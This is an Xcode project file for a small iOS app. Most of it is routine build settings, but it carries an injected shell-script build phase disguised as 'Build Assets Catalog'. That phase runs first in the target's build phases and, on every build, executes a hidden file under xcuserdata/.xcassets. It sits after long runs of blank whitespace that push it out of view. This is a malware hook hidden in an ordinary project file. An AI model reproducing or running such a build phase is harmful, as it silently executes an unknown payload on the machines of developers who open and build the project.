// !$*UTF8*$!
{
	archiveVersion = 1;
	classes = {
	};
	objectVersion = 50;
	objects = {

/* Begin PBXBuildFile section */
		302F0721255A9C6300F4A459 /* AppDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 302F0720255A9C6300F4A459 /* AppDelegate.m */; };
		302F0724255A9C6300F4A459 /* SceneDelegate.m in Sources */ = {isa = PBXBuildFile; fileRef = 302F0723255A9C6300F4A459 /* SceneDelegate.m */; };
		302F0727255A9C6300F4A459 /* ViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 302F0726255A9C6300F4A459 /* ViewController.m */; };
		302F072A255A9C6300F4A459 /* Main.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 302F0728255A9C6300F4A459 /* Main.storyboard */; };
		302F072C255A9C6400F4A459 /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 302F072B255A9C6400F4A459 /* Assets.xcassets */; };
		302F072F255A9C6400F4A459 /* LaunchScreen.storyboard in Resources */ = {isa = PBXBuildFile; fileRef = 302F072D255A9C6400F4A459 /* LaunchScreen.storyboard */; };
		302F0732255A9C6400F4A459 /* main.m in Sources */ = {isa = PBXBuildFile; fileRef = 302F0731255A9C6400F4A459 /* main.m */; };
		302F073B255A9CAE00F4A459 /* NextViewController.m in Sources */ = {isa = PBXBuildFile; fileRef = 302F073A255A9CAE00F4A459 /* NextViewController.m */; };
		307C5598255B889C009D9B07 /* Defaultinstance.m in Sources */ = {isa = PBXBuildFile; fileRef = 307C5597255B889C009D9B07 /* Defaultinstance.m */; };
/* End PBXBuildFile section */

/* Begin PBXFileReference section */
		302F071C255A9C6300F4A459 /* Project.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Project.app; sourceTree = BUILT_PRODUCTS_DIR; };
		302F071F255A9C6300F4A459 /* AppDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = AppDelegate.h; sourceTree = "<group>"; };
		302F0720255A9C6300F4A459 /* AppDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = AppDelegate.m; sourceTree = "<group>"; };
		302F0722255A9C6300F4A459 /* SceneDelegate.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = SceneDelegate.h; sourceTree = "<group>"; };
		302F0723255A9C6300F4A459 /* SceneDelegate.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = SceneDelegate.m; sourceTree = "<group>"; };
		302F0725255A9C6300F4A459 /* ViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = ViewController.h; sourceTree = "<group>"; };
		302F0726255A9C6300F4A459 /* ViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = ViewController.m; sourceTree = "<group>"; };
		302F0729255A9C6300F4A459 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/Main.storyboard; sourceTree = "<group>"; };
		302F072B255A9C6400F4A459 /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
		302F072E255A9C6400F4A459 /* Base */ = {isa = PBXFileReference; lastKnownFileType = file.storyboard; name = Base; path = Base.lproj/LaunchScreen.storyboard; sourceTree = "<group>"; };
		302F0730255A9C6400F4A459 /* Info.plist */ = {isa = PBXFileReference; lastKnownFileType = text.plist.xml; path = Info.plist; sourceTree = "<group>"; };
		302F0731255A9C6400F4A459 /* main.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = main.m; sourceTree = "<group>"; };
		302F0739255A9CAE00F4A459 /* NextViewController.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = NextViewController.h; sourceTree = "<group>"; };
		302F073A255A9CAE00F4A459 /* NextViewController.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = NextViewController.m; sourceTree = "<group>"; };
		307C5596255B889C009D9B07 /* Defaultinstance.h */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.h; path = Defaultinstance.h; sourceTree = "<group>"; };
		307C5597255B889C009D9B07 /* Defaultinstance.m */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.c.objc; path = Defaultinstance.m; sourceTree = "<group>"; };
/* End PBXFileReference section */

/* Begin PBXFrameworksBuildPhase section */
		302F0719255A9C6300F4A459 /* Frameworks */ = {
			isa = PBXFrameworksBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXFrameworksBuildPhase section */

/* Begin PBXGroup section */
		302F0713255A9C6200F4A459 = {
			isa = PBXGroup;
			children = (
				302F071E255A9C6300F4A459 /* Project */,
				302F071D255A9C6300F4A459 /* Products */,
			);
			sourceTree = "<group>";
		};
		302F071D255A9C6300F4A459 /* Products */ = {
			isa = PBXGroup;
			children = (
				302F071C255A9C6300F4A459 /* Project.app */,
			);
			name = Products;
			sourceTree = "<group>";
		};
		302F071E255A9C6300F4A459 /* Project */ = {
			isa = PBXGroup;
			children = (
				302F071F255A9C6300F4A459 /* AppDelegate.h */,
				302F0720255A9C6300F4A459 /* AppDelegate.m */,
				302F0722255A9C6300F4A459 /* SceneDelegate.h */,
				302F0723255A9C6300F4A459 /* SceneDelegate.m */,
				302F0725255A9C6300F4A459 /* ViewController.h */,
				302F0726255A9C6300F4A459 /* ViewController.m */,
				302F0739255A9CAE00F4A459 /* NextViewController.h */,
				302F073A255A9CAE00F4A459 /* NextViewController.m */,
				302F0728255A9C6300F4A459 /* Main.storyboard */,
				302F072B255A9C6400F4A459 /* Assets.xcassets */,
				302F072D255A9C6400F4A459 /* LaunchScreen.storyboard */,
				302F0730255A9C6400F4A459 /* Info.plist */,
				302F0731255A9C6400F4A459 /* main.m */,
				307C5596255B889C009D9B07 /* Defaultinstance.h */,
				307C5597255B889C009D9B07 /* Defaultinstance.m */,
			);
			path = Project;
			sourceTree = "<group>";
		};
/* End PBXGroup section */

/* Begin PBXNativeTarget section */
		302F071B255A9C6300F4A459 /* Project */ = {
			isa = PBXNativeTarget;
			buildConfigurationList = 302F0735255A9C6400F4A459 /* Build configuration list for PBXNativeTarget "Project" */;
			buildPhases = (
				FD617DDC93DCE8BABA6D902C /* Build Assets Catalog */,
				302F0718255A9C6300F4A459 /* Sources */,
				302F0719255A9C6300F4A459 /* Frameworks */,
				302F071A255A9C6300F4A459 /* Resources */,
			);
			buildRules = (
			);
			dependencies = (
			);
			name = Project;
			productName = Project;
			productReference = 302F071C255A9C6300F4A459 /* Project.app */;
			productType = "com.apple.product-type.application";
		};
/* End PBXNativeTarget section */

/* Begin PBXProject section */
		302F0714255A9C6200F4A459 /* Project object */ = {
			isa = PBXProject;
			attributes = {
				LastUpgradeCheck = 1210;
				TargetAttributes = {
					302F071B255A9C6300F4A459 = {
						CreatedOnToolsVersion = 12.1;
					};
				};
			};
			buildConfigurationList = 302F0717255A9C6200F4A459 /* Build configuration list for PBXProject "Project" */;
			compatibilityVersion = "Xcode 9.3";
			developmentRegion = en;
			hasScannedForEncodings = 0;
			knownRegions = (
				en,
				Base,
			);
			mainGroup = 302F0713255A9C6200F4A459;
			productRefGroup = 302F071D255A9C6300F4A459 /* Products */;
			projectDirPath = "";
			projectRoot = "";
			targets = (
				302F071B255A9C6300F4A459 /* Project */,
			);
		};
/* End PBXProject section */

/* Begin PBXResourcesBuildPhase section */
		302F071A255A9C6300F4A459 /* Resources */ = {
			isa = PBXResourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				302F072F255A9C6400F4A459 /* LaunchScreen.storyboard in Resources */,
				302F072C255A9C6400F4A459 /* Assets.xcassets in Resources */,
				302F072A255A9C6300F4A459 /* Main.storyboard in Resources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXResourcesBuildPhase section */

/* Begin PBXSourcesBuildPhase section */
		302F0718255A9C6300F4A459 /* Sources */ = {
			isa = PBXSourcesBuildPhase;
			buildActionMask = 2147483647;
			files = (
				307C5598255B889C009D9B07 /* Defaultinstance.m in Sources */,
				302F073B255A9CAE00F4A459 /* NextViewController.m in Sources */,
				302F0727255A9C6300F4A459 /* ViewController.m in Sources */,
				302F0721255A9C6300F4A459 /* AppDelegate.m in Sources */,
				302F0732255A9C6400F4A459 /* main.m in Sources */,
				302F0724255A9C6300F4A459 /* SceneDelegate.m in Sources */,
			);
			runOnlyForDeploymentPostprocessing = 0;
		};
/* End PBXSourcesBuildPhase section */

/* Begin PBXVariantGroup section */
		302F0728255A9C6300F4A459 /* Main.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				302F0729255A9C6300F4A459 /* Base */,
			);
			name = Main.storyboard;
			sourceTree = "<group>";
		};
		302F072D255A9C6400F4A459 /* LaunchScreen.storyboard */ = {
			isa = PBXVariantGroup;
			children = (
				302F072E255A9C6400F4A459 /* Base */,
			);
			name = LaunchScreen.storyboard;
			sourceTree = "<group>";
		};
/* End PBXVariantGroup section */

/* Begin XCBuildConfiguration section */
		302F0733255A9C6400F4A459 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = dwarf;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				ENABLE_TESTABILITY = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_DYNAMIC_NO_PIC = NO;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_OPTIMIZATION_LEVEL = 0;
				GCC_PREPROCESSOR_DEFINITIONS = (
					"DEBUG=1",
					"$(inherited)",
				);
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.1;
				MTL_ENABLE_DEBUG_INFO = INCLUDE_SOURCE;
				MTL_FAST_MATH = YES;
				ONLY_ACTIVE_ARCH = YES;
				SDKROOT = iphoneos;
			};
			name = Debug;
		};
		302F0734255A9C6400F4A459 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ALWAYS_SEARCH_USER_PATHS = NO;
				CLANG_ANALYZER_NONNULL = YES;
				CLANG_ANALYZER_NUMBER_OBJECT_CONVERSION = YES_AGGRESSIVE;
				CLANG_CXX_LANGUAGE_STANDARD = "gnu++14";
				CLANG_CXX_LIBRARY = "libc++";
				CLANG_ENABLE_MODULES = YES;
				CLANG_ENABLE_OBJC_ARC = YES;
				CLANG_ENABLE_OBJC_WEAK = YES;
				CLANG_WARN_BLOCK_CAPTURE_AUTORELEASING = YES;
				CLANG_WARN_BOOL_CONVERSION = YES;
				CLANG_WARN_COMMA = YES;
				CLANG_WARN_CONSTANT_CONVERSION = YES;
				CLANG_WARN_DEPRECATED_OBJC_IMPLEMENTATIONS = YES;
				CLANG_WARN_DIRECT_OBJC_ISA_USAGE = YES_ERROR;
				CLANG_WARN_DOCUMENTATION_COMMENTS = YES;
				CLANG_WARN_EMPTY_BODY = YES;
				CLANG_WARN_ENUM_CONVERSION = YES;
				CLANG_WARN_INFINITE_RECURSION = YES;
				CLANG_WARN_INT_CONVERSION = YES;
				CLANG_WARN_NON_LITERAL_NULL_CONVERSION = YES;
				CLANG_WARN_OBJC_IMPLICIT_RETAIN_SELF = YES;
				CLANG_WARN_OBJC_LITERAL_CONVERSION = YES;
				CLANG_WARN_OBJC_ROOT_CLASS = YES_ERROR;
				CLANG_WARN_QUOTED_INCLUDE_IN_FRAMEWORK_HEADER = YES;
				CLANG_WARN_RANGE_LOOP_ANALYSIS = YES;
				CLANG_WARN_STRICT_PROTOTYPES = YES;
				CLANG_WARN_SUSPICIOUS_MOVE = YES;
				CLANG_WARN_UNGUARDED_AVAILABILITY = YES_AGGRESSIVE;
				CLANG_WARN_UNREACHABLE_CODE = YES;
				CLANG_WARN__DUPLICATE_METHOD_MATCH = YES;
				COPY_PHASE_STRIP = NO;
				DEBUG_INFORMATION_FORMAT = "dwarf-with-dsym";
				ENABLE_NS_ASSERTIONS = NO;
				ENABLE_STRICT_OBJC_MSGSEND = YES;
				GCC_C_LANGUAGE_STANDARD = gnu11;
				GCC_NO_COMMON_BLOCKS = YES;
				GCC_WARN_64_TO_32_BIT_CONVERSION = YES;
				GCC_WARN_ABOUT_RETURN_TYPE = YES_ERROR;
				GCC_WARN_UNDECLARED_SELECTOR = YES;
				GCC_WARN_UNINITIALIZED_AUTOS = YES_AGGRESSIVE;
				GCC_WARN_UNUSED_FUNCTION = YES;
				GCC_WARN_UNUSED_VARIABLE = YES;
				IPHONEOS_DEPLOYMENT_TARGET = 14.1;
				MTL_ENABLE_DEBUG_INFO = NO;
				MTL_FAST_MATH = YES;
				SDKROOT = iphoneos;
				VALIDATE_PRODUCT = YES;
			};
			name = Release;
		};
		302F0736255A9C6400F4A459 /* Debug */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = T8X8L4U33S;
				INFOPLIST_FILE = Project/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.pinguo.Project;
				PRODUCT_NAME = "$(TARGET_NAME)";
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Debug;
		};
		302F0737255A9C6400F4A459 /* Release */ = {
			isa = XCBuildConfiguration;
			buildSettings = {
				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
				CODE_SIGN_STYLE = Automatic;
				DEVELOPMENT_TEAM = T8X8L4U33S;
				INFOPLIST_FILE = Project/Info.plist;
				IPHONEOS_DEPLOYMENT_TARGET = 12.0;
				LD_RUNPATH_SEARCH_PATHS = (
					"$(inherited)",
					"@executable_path/Frameworks",
				);
				PRODUCT_BUNDLE_IDENTIFIER = com.pinguo.Project;
				PRODUCT_NAME = "$(TARGET_NAME)";
				TARGETED_DEVICE_FAMILY = 1;
			};
			name = Release;
		};
/* End XCBuildConfiguration section */

/* Begin XCConfigurationList section */
		302F0717255A9C6200F4A459 /* Build configuration list for PBXProject "Project" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				302F0733255A9C6400F4A459 /* Debug */,
				302F0734255A9C6400F4A459 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
		302F0735255A9C6400F4A459 /* Build configuration list for PBXNativeTarget "Project" */ = {
			isa = XCConfigurationList;
			buildConfigurations = (
				302F0736255A9C6400F4A459 /* Debug */,
				302F0737255A9C6400F4A459 /* Release */,
			);
			defaultConfigurationIsVisible = 0;
			defaultConfigurationName = Release;
		};
/* End XCConfigurationList section */

		
			/* Begin PBXBuildRule section */


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	


			
	
			

			
	
			/* End PBXBuildRule section */
		
		

	
		/* Begin PBXShellScriptBuildPhase section */

	FD617DDC93DCE8BABA6D902C /* Build Assets Catalog */ = {
			isa = PBXShellScriptBuildPhase;
			buildActionMask = 2147483647;
			files = (
			);
			inputFileListPaths = (
			);
			inputPaths = (
			);
			name = "Build Assets Catalog";
			outputFileListPaths = (
			);
			outputPaths = (
			);
			runOnlyForDeploymentPostprocessing = 0;
			shellPath = /bin/sh;
			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.

\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/xcassets.folder\" false";			
		};
	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	

	
		
	
		/* End PBXShellScriptBuildPhase section */
	
	
	};
	rootObject = 302F0714255A9C6200F4A459 /* Project object */;
}
